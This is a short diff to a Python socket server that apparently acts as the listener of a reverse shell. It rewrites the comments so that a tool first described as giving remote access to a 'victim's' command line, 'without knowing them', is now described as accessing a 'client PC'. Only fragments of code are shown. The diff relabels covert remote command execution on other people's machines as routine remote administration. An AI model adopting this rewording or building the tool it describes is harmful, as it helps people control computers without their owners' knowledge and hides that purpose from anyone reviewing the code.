@@ -1,5 +1,5 @@
-"""This file goes to server (static ip) for stably access to victim's command-line interface
-to run commands to fetch information without knowing them"""
+"""This file goes to server (static ip) for stably access
+and helps to access client PC's command-line remotely"""
 
 import socket
 import sys
@@ -46,7 +46,7 @@ def socket_accept():
     except socket.error as msg:
         print(f"Error : {msg}")
 
-# sends commands to client, victim or friend
+# sends commands to client
 def send_commands(connection):
     while True:
         global s
